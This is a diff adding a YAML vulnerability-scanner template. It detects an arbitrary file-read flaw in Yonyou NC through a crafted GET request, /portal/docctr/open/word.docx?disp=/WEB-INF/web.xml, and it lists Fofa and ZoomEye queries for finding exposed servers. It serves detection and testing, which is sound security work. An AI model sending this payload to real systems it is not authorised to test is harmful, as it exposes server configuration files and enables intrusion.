@@ -1,0 +1,27 @@
+id: yonyou-nc-word-docx-fileread
+
+info:
+  name: 用友NC word.docx存在任意文件读取漏洞
+  author: Y3y1ng
+  severity: high
+  verified: true
+  description: |-
+    用友 NC 前台存在open/word.docx文件读取漏洞，攻击者尝试拼接恶意请求实现任意文件读取，从而获取敏感文件路径信息。
+    Fofa: body="UClient.dmg"
+    ZoomEye: app:"Yonyou NC httpd"
+  reference:
+    - https://mp.weixin.qq.com/s/RKAwMJoUivdzuQ6umuPKWw
+  tags: yonyou,fileread
+  created: 2023/12/04
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml
+    expression: |
+      response.status == 200 &&
+      response.body.bcontains(b"<?xml") &&
+      response.body.bcontains(b"encoding") &&
+      response.body.bcontains(b"NC Portal")
+expression: r0()
